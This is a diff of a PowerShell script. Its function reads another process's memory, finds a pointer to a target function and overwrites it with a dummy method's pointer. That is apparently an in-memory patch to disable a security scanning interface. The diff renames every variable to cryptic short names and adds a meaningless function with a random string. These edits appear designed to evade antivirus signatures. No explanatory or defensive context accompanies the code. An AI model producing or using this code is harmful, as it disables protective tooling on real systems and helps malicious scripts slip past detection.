@@ -1,23 +1,27 @@
+function boring {
+$random = '123456789012345677898421423523654364543141'
+}
+
 function Cool {
-    :initialloop for($j = $InitialStart; $j -lt $MaxOffset; $j += $NegativeOffset){
-        [IntPtr] $MethodPointerToSearch = [Int64] $MethodPointer - $j
-        $ReadedMemoryArray = [byte[]]::new($ReadBytes)
-        $ApiReturn = [APIs]::ReadProcessMemory($Handle, $MethodPointerToSearch, $ReadedMemoryArray, $ReadBytes,[ref]$dummy)
-        for ($i = 0; $i -lt $ReadedMemoryArray.Length; $i += 1) {
-        $bytes = [byte[]]($ReadedMemoryArray[$i], $ReadedMemoryArray[$i + 1], $ReadedMemoryArray[$i + 2], $ReadedMemoryArray[$i + 3], $ReadedMemoryArray[$i + 4], $ReadedMemoryArray[$i + 5], $ReadedMemoryArray[$i + 6], $ReadedMemoryArray[$i + 7])
-        [IntPtr] $PointerToCompare = [bitconverter]::ToInt64($bytes,0)
-        if ($PointerToCompare -eq $funcAddr) {
+    :initialloop for($j = $initst; $j -lt $maxof; $j += $negoff){
+        [IntPtr] $meptos = [Int64] $mepter - $j
+        $redmemarr = [byte[]]::new($ReadBytes)
+        $apir = [APIs]::ReadProcessMemory($Handle, $meptos, $redmemarr, $ReadBytes,[ref]$dummy)
+        for ($i = 0; $i -lt $redmemarr.Length; $i += 1) {
+        $bytes = [byte[]]($redmemarr[$i], $redmemarr[$i + 1], $redmemarr[$i + 2], $redmemarr[$i + 3], $redmemarr[$i + 4], $redmemarr[$i + 5], $redmemarr[$i + 6], $redmemarr[$i + 7])
+        [IntPtr] $potc = [bitconverter]::ToInt64($bytes,0)
+        if ($potc -eq $funcAddr) {
             Write-Host "Found @ $($j) : $($i)!"
-            [IntPtr] $MemoryToPatch = [Int64] $MethodPointerToSearch + $i
+            [IntPtr] $mop = [Int64] $meptos + $i
             break initialloop
         }
         }
     }
-    [IntPtr] $DummyPointer = [APIs].GetMethod('Dummy').MethodHandle.GetFunctionPointer()
-    $buf = [IntPtr[]] ($DummyPointer)
-    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $MemoryToPatch, 1)
+    [IntPtr] $dup = [APIs].GetMethod('Dummy').MethodHandle.GetFunctionPointer()
+    $buf = [IntPtr[]] ($dup)
+    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $mop, 1)
 
-    $FinishDate=Get-Date;
-    $TimeElapsed = ($FinishDate - $InitialDate).TotalSeconds;
-    Write-Host "$TimeElapsed seconds"
+    $fd=Get-Date;
+    $te = ($fd - $InitialDate).TotalSeconds;
+    Write-Host "$te seconds"
 }
